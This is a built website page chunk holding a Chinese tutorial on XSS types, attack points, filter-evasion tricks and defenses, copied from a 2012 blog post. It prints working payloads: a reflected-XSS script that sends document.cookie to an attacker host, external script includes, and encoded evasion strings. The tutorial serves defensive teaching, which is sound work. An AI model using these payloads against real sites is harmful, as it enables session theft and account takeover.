import{_ as s,o as e,c as t,j as a,a as n}from"./chunks/framework.DJo0M80U.js";const m=JSON.parse('{"title":"XSS分类","description":"\\\\ 来自 \\\\<https://www.cnblogs.com/loveis715/archive/2012/07/13/2506846.html\\\\。","frontmatter":{"title":"XSS分类","date":"2026-08-11T00:00:00.000Z","categories":["React 系统教程"],"tags":["React","Redux","前端","教程","OneNote","核心概念与组件"],"description":"\\\\ 来自 \\\\<https://www.cnblogs.com/loveis715/archive/2012/07/13/2506846.html\\\\。","sidebarWeight":47,"lastUpdated":false,"feed":false,"source":"onenote","sourceNote":"OneNote/f-vue/概念/react 中正常显示HTML(dangerouslySetInnerHTML)/XSS分类.md"},"headers":[],"relativePath":"posts/React系统教程/01-核心概念与组件/react 中正常显示HTML(dangerouslySetInnerHTML)/XSS分类.md","filePath":"posts/React系统教程/01-核心概念与组件/react 中正常显示HTML(dangerouslySetInnerHTML)/XSS分类.md"}'),p={name:"posts/React系统教程/01-核心概念与组件/react 中正常显示HTML(dangerouslySetInnerHTML)/XSS分类.md"};function i(c,l,S,r,o,u){return e(),t("div",null,[...l[0]||(l[0]=[a("div",null,[a("h1",{id:"xss分类",tabindex:"-1"},[n("XSS分类 "),a("a",{class:"header-anchor",href:"#xss分类","aria-label":'Permalink to "XSS分类"'},"​")]),a("blockquote",null,[a("p",null,"本节目标：理解“XSS分类”的核心思路，并能把它用于实际开发或面试表达。")]),a("div",{class:"language- vp-adaptive-theme"},[a("button",{title:"Copy Code",class:"copy"}),a("span",{class:"lang"}),a("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0","v-pre":""},[a("code",null,[a("span",{class:"line"},[a("span",null,"上面的XSS示例实际上是最容易理解的一种：Stored。除此之外，XSS攻击还包含另外两种攻击方式：Reflected以及DOM Based（Type-0 XSS）。下面我们就来具体讲解各个攻击方式以及各自的特点。")]),n(`
`),a("span",{class:"line"},[a("span",null,"首先要讲解的就是我们已经见过的Stored攻击。该攻击的最大特点就是，用于攻击的数据永久地存储在目标网站的服务器中。试着回想上面所给出的例子：在恶意用户提交带有恶意代码的评论时，为了能让该评论可以被其它用户看到，网站的开发人员必然需要将其永久性地存储起来，例如数据库。使用该方法进行攻击的XSS将对所有访问该页面的用户可见，并且一直保存下去，直到该评论被管理员处理。")]),n(`
`),a("span",{class:"line"},[a("span",null,"第二类XSS攻击则是Reflected攻击。该攻击的最大特点则与Stored攻击相对：用于攻击的数据并不是永久地存储在目标网站的服务器中。")]),n(`
`),a("span",{class:"line"},[a("span",null,"那这种攻击是如何实现的呢？请试想这样一种情况：某个网站允许其用户通过搜索的方式查找具有特定名称的商户。对于商户名称SomeStore，该搜索功能所返回的页面地址可能为：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 [www.SomeWeb.com/search.jsp?storename=SomeStore](http://www.SomeWeb.com/search.jsp?storename=SomeStore)")]),n(`
`),a("span",{class:"line"},[a("span",null,"如果该查找功能没有查找到具有该名称的商户，那么网站将会返回一个错误页面：没有查找到名称为SomeStore的商户信息。此时恶意用户首先可以通过在搜索栏中输入<Script>alert(“XSS attack available!”);<\/Script>并执行搜索判断该网站是否有XSS漏洞。如果返回的搜索页面出现了“XSS attack available!”消息框，那就表示该页面仅仅简单地将URL中的参数SomeStore显示在了页面之中，而并没有对脚本的执行做出防备。接下来，恶意用户就可以将商户名设为如下的恶意代码：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <script>document.write('<img src=http://www.hackerhome.com/grabber.jsp?msg='+document.cookie+'2     width=0 height=0 border=0 />SomeStore');<\/script>")]),n(`
`),a("span",{class:"line"},[a("span",null,"也正是由于搜索页面仅仅简单地将该部分组成直接嵌于页面之上，因此用户从服务器端得到的网页将包含该段代码，其将自动访问hackerhome上的grabber.jsp，并将用户的cookie作为参数msg的值，从而使得受害者的cookie失窃。")]),n(`
`),a("span",{class:"line"},[a("span",null,"但是如何让用户访问这个页面呢？很简单，恶意用户仅仅需要向那些受害者发送该搜索的链接，并为该链接附上一段具有吸引力的话即可。如果受害者点击了该恶意链接，同时该网站的cookie在受害者的本地机器上没有过期，那么这个cookie将被恶意网站hackerhome所窃取。")]),n(`
`),a("span",{class:"line"},[a("span",null,"还有一种类型的攻击也被归类为Reflected类型的攻击，那就是利用data:协议动态生成文件。该协议允许客户端直接创建二进制文件，如Doc或PDF文件等，并使用相应应用程序打开该文件。例如，恶意用户可以通过XSS插入下面的链接：")]),n(`
`),a("span",{class:"line"},[a("span",null,'1 <a href="data:text/html;base64,PHNjcmlwdD5vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9J3h2    4b28nO2Nsb3NlKCk8L3NjcmlwdD4=" target="_blank">Click me</a>')]),n(`
`),a("span",{class:"line"},[a("span",null,"如果用户点击了该链接，那么电脑将自动使用关联的程序打开该文件。由于这些文件的读取等动作都需要相应的应用程序支持，因此恶意人员可以更进一步地利用相应的应用程序漏洞执行更丰富的攻击。")]),n(`
`),a("span",{class:"line"},[a("span",null,"最后一种则是DOM Based攻击，又常常被称为Type-0 XSS攻击。它与前两种攻击方式拥有很大的不同：Stored和Reflected方式中，对有害内容的生成是在服务端完成的，而DOM Based攻击中，对有害内容的生成是在客户端完成的。例如一个图片浏览页面在URL中使用index参数表示当前用户所察看图片的索引，并通过javascript动态写入HTML元素：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <script>2     var index = getIndex(document.URL);3     document.write(“<IMG src=’www.imagestore.com/album1984/image?index=’ + index + ‘/>’”)4 <\/script>")]),n(`
`),a("span",{class:"line"},[a("span",null,"那么恶意用户就可以通过在URL的index参数中插入其它信息来完成。例如在该URL中，恶意用户可以为index参数指定参数值后额外添加一部分恶意语句，如经过编码后的index=1/><script>alert(“XSS attack available!”)<\/script><img width=0 height=0。当然，恶意用户并不会希望用户自己攻击自己，因此他仍然需要做一些额外的社会工作，例如发送邮件给受害者并诱使他点击该有害链接等。")]),n(`
`),a("span",{class:"line"},[a("span")]),n(`
`),a("span",{class:"line"},[a("span",null,"**攻击点**")]),n(`
`),a("span",{class:"line"},[a("span",null,"相信经过前面的讲解，您已经了解了XSS攻击所常用的三种方法。知道了方法以后，我们还要知道各个方法的目标，从而更好地在各个目标上对XSS攻击进行预防。")]),n(`
`),a("span",{class:"line"},[a("span",null,"首先要清楚的是，XSS攻击所利用的都是页面中动态生成的部分。为了能让攻击顺利进行，这些动态生成的部分应能包含一系列代码，以通过这些代码的执行达到恶意用户的目的。更改页面所使用的动态组成是XSS攻击的第一步，而令这些动态组成在动态生成的内容中起作用则是XSS攻击的第二步。因此对于页面中使用动态内容的组成，我们需要根据其所在位置执行特定的检查。在不同的位置所允许的动态内容格式并不相同，而我们要做的就是屏蔽这些使用方法。")]),n(`
`),a("span",{class:"line"},[a("span",null,"接下来需要读者清楚地是，攻击常常利用了各个组成中的特殊符号或关键字。例如对HTML标记的攻击就可以通过字符’>’将当前标记关闭，从而使插入script标记成为了可能。再比如对javascript的攻击则可以利用表示当前语句结束的分号’;’，进而输入下一句具有危害性的代码。所以说，各种XSS攻击所使用的手法需要根据攻击点所在的页面组成分别进行讨论。")]),n(`
`),a("span",{class:"line"},[a("span",null,"第一个要说的就是HTML标记。HTML标记可以通过JSP，Javascript等方式动态生成。而在HTML标记中添加可执行代码的最常用方法就是<script>标记。例如对于下面的JSP代码：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <body … title=<%=title%>>…</body>")]),n(`
`),a("span",{class:"line"},[a("span",null,"如果title记录的是字符串100><script> alert(“XSS attack available!”);<\/script，那么最终生成的HTML文件将如下所示：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <body … title=100><script>alert(“XSS attack available!”);<\/script>…</body>")]),n(`
`),a("span",{class:"line"},[a("span",null,"可以看到，恶意攻击者所精心设计的标记将能够在普通用户毫无察觉的情况下执行恶意代码。")]),n(`
`),a("span",{class:"line"},[a("span",null,"当然，恶意攻击者也可以选择不插入script标记，而是通过插入别的标记并在标记中插入对事件进行响应的javascript脚本来完成。如令上面的width变量为100><div onmousemove=”doEvil()”/，从而使最终的生成结果变为：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <body … width=100><div onmousemove=”doEvil()”/>…</body>")]),n(`
`),a("span",{class:"line"},[a("span",null,"除此之外，恶意用户还可以对HTML标记中的属性动动手脚。我们知道，动态生成的HTML常常使用外部的一些变量生成其内容。例如一个JSP页面中可能存在着如下HTML元素：<body title=<%=somevar%> id=textbox>。可以看到，JSP变量somevar用来初始化属性title的值。但是如果恶意用户设法让该变量的值为a onload=alert(“XSS attack available!”)，那么该元素的HTML标记将最终变为：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <body title=a onload=alert(“XSS attack available!”)>")]),n(`
`),a("span",{class:"line"},[a("span",null,"也既是将在文档被载入时执行onload事件的响应代码，即为这里的alert(“XSS attack available!”)。")]),n(`
`),a("span",{class:"line"},[a("span",null,"再比如，对HTML注释进行攻击。如果一个HTML注释中使用了JSP变量，那么恶意用户完全可以通过注释结束标记打开注释，并在恶意代码之后重新启动注释。例如对于注释中使用的JSP变量comment：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <!-- ...<%=comment%>-->")]),n(`
`),a("span",{class:"line"},[a("span",null,"恶意用户可以尝试令JSP变量comment的值为--><script>alert(“XSS attack available!”)<\/script><!--。这样，一段脚本就成功地插入到了页面中：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <!----><script>alert(“XSS attack available!”)<\/script><!---->")]),n(`
`),a("span",{class:"line"},[a("span",null,"除了HTML标记之外，对样式进行攻击也是XSS所使用的一个主要方法。在样式中，我们可以使用expression以及url指定一段代码，以动态求得所需要使用的样式。这也就为XSS攻击提供了一个契机：如果我们是通过一个JSP变量初始化的样式，那么恶意用户就可以尝试通过将该变量初始化为一个恶意表达式来完成攻击。例如对于如下两种样式：")]),n(`
`),a("span",{class:"line"},[a("span",null,'1 <DIV STYLE="width: <%=width%>">2 <DIV STYLE="background-image: <%=image%>">')]),n(`
`),a("span",{class:"line"},[a("span",null,"如果这两个JSP变量的值可以被某种用户输入更改，那么对这两个JSP变量width及image的使用就存在着一定的风险：在加载并使用这些样式的时候，该变量中所包含的脚本代码将被执行。例如在这两个变量分别为expression(alert('XSS attack available!'))及url(javascript:alert('XSS attack available!'))时，该页面的加载将显示“XSS attack available!”的警告信息。")]),n(`
`),a("span",{class:"line"},[a("span",null,"除了样式和HTML标记之外，对Javascript的攻击也是非常常见的。在Javascript中使用JSP变量是一种非常常见的用法。在这种用法中，恶意用户仍然有办法执行攻击。例如对于下面的Javascript变量声明：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 var index = <%=index%>;")]),n(`
`),a("span",{class:"line"},[a("span",null,"对这种变量赋值进行攻击的方法非常简单：使用分号结束当前赋值语句，并在其后添加恶意代码即可。例如令index为0; alert(“XSS attack available!”);。那么最终生成的javascript将为：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 var index = 0; alert(“XSS attack available!”);")]),n(`
`),a("span",{class:"line"},[a("span",null,"当然，这里仅仅列出了一些通用的攻击手段，确切来说，就是攻击的点。而在各个点上进行攻击的方法又会分为很多种，甚至有些和浏览器相关。在后面的一节中，本文就将对这些变种进行简单的介绍。")]),n(`
`),a("span",{class:"line"},[a("span")]),n(`
`),a("span",{class:"line"},[a("span",null,"**变通方法**")]),n(`
`),a("span",{class:"line"},[a("span",null,"您可能在想：我通过对这些特殊情况进行处理，筛选出这些可能的攻击，那我的网站是不是就安全了？这里的答案是：不完全安全。首先，对每个攻击点进行攻击的方法可以拥有众多变种，因此对攻击点的防御并不是简单地将具有固定匹配模式的关键字筛选出去即可。其次，随着HTML等技术的演化以及浏览器的不断更新，对各个攻击点进行攻击的变化也在不断发展着。最后，各个浏览器内部对HTML进行分析的过程以及对错误进行纠正的能力各不相同，而有些攻击就是针对这种浏览器的特性而产生的。因此我们并不应自行实现对XSS攻击进行过滤的筛选器。")]),n(`
`),a("span",{class:"line"},[a("span",null,"当然，仅仅在这里说XSS拥有一系列变通方式并不能让人完全信服，因此本节中列举了一系列常用的变通方式。")]),n(`
`),a("span",{class:"line"},[a("span",null,"一种常用的规避检测的方法就是使用大小写变化。例如恶意用户可以更改恶意代码url(javascript:alert('XSS attack available!'))的大小写，如url(jAVAsCriPt:alert('XSS attack available!'))。这是筛选器所需要处理的最基本情况。")]),n(`
`),a("span",{class:"line"},[a("span",null,"除此之外，筛选器还需要能够处理隐式创建字符串的情况。例如在javascript中，我们可以通过String.fromCharCode()函数隐式地创建字符串。那么通过和document.write()函数的组合，恶意用户可以非常隐蔽地向HTML文档写入字符串：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 document.write(String.fromCharCode(88,83,83)); // 写入XSS")]),n(`
`),a("span",{class:"line"},[a("span",null,"而更令人头疼的则是通过编码规避筛选器的检测。例如对于下面的恶意代码：")]),n(`
`),a("span",{class:"line"},[a("span",null,`1 <IMG SRC="javascript:alert('XSS');">`)]),n(`
`),a("span",{class:"line"},[a("span",null,"您可以通过UTF-8的方式对其进行编码：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>")]),n(`
`),a("span",{class:"line"},[a("span",null,"而不包含分号的UTF-8编码则如下所示：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108")]),n(`
`),a("span",{class:"line"},[a("span",null,"&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>")]),n(`
`),a("span",{class:"line"},[a("span",null,"而该编码也可以使用十六进制：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>")]),n(`
`),a("span",{class:"line"},[a("span",null,"甚至只编码一个字符：")]),n(`
`),a("span",{class:"line"},[a("span",null,`1 <IMG SRC="jav&#x61;script:alert('XSS');">`)]),n(`
`),a("span",{class:"line"},[a("span",null,"另外，在javascript中加入tab，回车，换行，\\0等符号也需要考虑在内，因为对于众多浏览器而言，这种写法是合法的：")]),n(`
`),a("span",{class:"line"},[a("span",null,`1 <IMG SRC="jav    ascript:alert('XSS');">2 <SCR\\0IPT>alert(\\"XSS\\")</SCR\\0IPT>`)]),n(`
`),a("span",{class:"line"},[a("span",null,"另外，我们也可以对这些字符进行编码：")]),n(`
`),a("span",{class:"line"},[a("span",null,`1 <IMG SRC="jav&#x0D;ascript:alert('XSS');">`)]),n(`
`),a("span",{class:"line"},[a("span",null,"这还仅仅是一些通用的规避XSS检测的手段。更有一些手段是针对特定浏览器的，更增加了XSS筛选器编写的难度。例如，由于某些浏览器会认为一个HTML元素中的非数字或字母的字符为非法字符，从而认为其后所跟的所有字符为空格，从而使下面的攻击变为可能（元素或者事件上都可以）：")]),n(`
`),a("span",{class:"line"},[a("span",null,'1 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"><\/SCRIPT>2 <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>')]),n(`
`),a("span",{class:"line"},[a("span",null,'同时，浏览器对HTML元素的分析以及XSS检测器的分析逻辑也有可能导致某些漏洞不能检查出来。例如某些检测器会首先查找匹配的元素，然后再检查元素中的内容。那么下面的攻击将无法被检测出来：<<SCRIPT>alert("XSS");//<<\/SCRIPT>')]),n(`
`),a("span",{class:"line"},[a("span",null,"类似地，某些浏览器会在某些不完整元素之后对元素自动进行修补。例如下面的Script元素开始标记以后没有结束标记，而Firefox将会为其添加结束元素：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1 <SCRIPT SRC=http://ha.ckers.org/xss.js?<B>")]),n(`
`),a("span",{class:"line"},[a("span",null,"这便会导致XSS筛选器的执行失败。")]),n(`
`),a("span",{class:"line"},[a("span",null,"其实，这里仅仅是希望您看到，自行编写一个XSS攻击的筛选器将是多么庞杂的工作。对于不同的网页组成，XSS所使用的攻击手法以及规避检测的手法各不相同。例如如果需要防护的是URL，那么首先需要对该URL进行循环解码操作，然后再检查其是否包含了有害的内容。同时，需要强调的是，各种规避检测的手法实际上都是对攻击手法的掩饰。因此XSS筛选器通常在最后一步真正执行对XSS攻击的检查，而前面的各各步骤，如解码等，都是用来识破真正攻击的环节。")]),n(`
`),a("span",{class:"line"},[a("span",null,"而我们真正要做的，则是正确地使用已有的解决方案保证网站的安全。")]),n(`
`),a("span",{class:"line"},[a("span")]),n(`
`),a("span",{class:"line"},[a("span",null,"**防御方法**")]),n(`
`),a("span",{class:"line"},[a("span",null,"当前，最常用的防御方法就是在生成网页的时候对不信任的输入进行检查，如URL以及动态生成的HTML标记等。而对于JSP/Servlet而言，最常用的方法就是JSTL（JavaServer Pages Standard Tag Library）的<c:out>标记及fn:escapeXml()函数。在页面中重新展示用户输入的时候，软件开发人员可以通过这些标记对XML进行筛选。")]),n(`
`),a("span",{class:"line"},[a("span",null,'1 <input name="foo" value="<c:out value="${value}" />">2 <input name="foo" value="${fn:escapeXml(value)}">')]),n(`
`),a("span",{class:"line"},[a("span",null,"可以看到，该方法是在JSP页面生成HTML页面的时候进行的。其实这是一种最常见的JSP页面处理方法。首先，我们无法在用户输入的时候知晓该数据将以什么方式传递回客户端。例如对于O'Malley，用在Javascript中时应为O\\x27Malley，而在HTML中则应为O&#x27;Malley。另外我们也无法保证是否某些数据已经通过其它漏洞被恶意修改。还有一个原因则是，一旦这些数据发生了更改，那么想要还原这些数据是不可能的。最后，对于恶意用户，系统管理员也需要通过数据库里所记录的恶意信息寻求执行法律处理。因此，在一般情况下，对用户的输入在输入端进行筛选及验证常常只是一个补充的验证手段，而很难全面地防御XSS。总的来说，这是因为XSS实际上是一个输出上的问题，而不是输入上的问题。")]),n(`
`),a("span",{class:"line"},[a("span",null,"一个较为困难的情况就是某些网络应用需要允许用户使用HTML的部分标记以提供对某些格式的支持。现有的一个比较好的做法则是首先将存储在数据库中的用户输入（如特定编辑器的输入）转化为html，然后将该html流通过一个白名单进行筛选，以清除危险的html标记及属性设置，并最终显示在页面之中。")]),n(`
`),a("span",{class:"line"},[a("span",null,"一般情况下，软件开发人员需要按照如下方式提供一个安全的HTML实现：")]),n(`
`),a("span",{class:"line"},[a("span",null,"1)       在页面的最一开始显式地标明Charset，以防止再被插入其它标明字符集的Meta信息，以允许UTF-7攻击。")]),n(`
`),a("span",{class:"line"},[a("span",null,"2)       检测URL以将其中包含的各种编码转化为固定编码。")]),n(`
`),a("span",{class:"line"},[a("span",null,"3)       检测CSS以防止其包含javascript或expression等可执行组成。")]),n(`
`),a("span",{class:"line"},[a("span",null,"4)       将所有用户输入都进行一次转化。例如将<替换为&lt;等。")]),n(`
`),a("span",{class:"line"},[a("span",null,"5)       检查所有的页面属性设置，以防止属性值没有被引号括起，或某些事件响应函数可以被用户输入所改变。")]),n(`
`),a("span",{class:"line"},[a("span",null,"6)       不允许用户所提供的HTML。")]),n(`
`),a("span",{class:"line"},[a("span",null,"7)      防止DOM攻击。")]),n(`
`),a("span",{class:"line"},[a("span")]),n(`
`),a("span",{class:"line"},[a("span",null,"**总结**")]),n(`
`),a("span",{class:"line"},[a("span",null,"所有类型的攻击实际上都是整个攻击过程中的一个点。特定类型的攻击利用程序中的特定漏洞。如XSS利用的就是网站中可以插入并执行用户输入的代码这一弱点。而后续的攻击手法，例如利用插入的脚本代码仿造用户行为则是CSRF。一般情况下，XSS并不可怕，但是如果XSS能够成功地完成攻击，那么软件开发人员就可以通过XSS完成更危险的攻击，如插入提交代码转移资金等。由于此时用户处于自身所下载的页面中，因此CSRF防御措施根本无法有效执行。")]),n(`
`),a("span",{class:"line"},[a("span",null,"XSS实际上是一种特殊类型的code injection。其最主要的特点就是利用动态网页的动态功能插入恶意代码以获得隐秘数据。而将数据传送到其它网络或将用户连接到其它网络的这一步骤则是恶意用户常常采用的行为，也便是跨站这个名称的由来。")])])])]),a("p",null,[n("> 来自 <"),a("a",{href:"https://www.cnblogs.com/loveis715/archive/2012/07/13/2506846.html",target:"_blank",rel:"noreferrer"},"https://www.cnblogs.com/loveis715/archive/2012/07/13/2506846.html"),n(">")])],-1)])])}const X=s(p,[["render",i]]);export{m as __pageData,X as default};
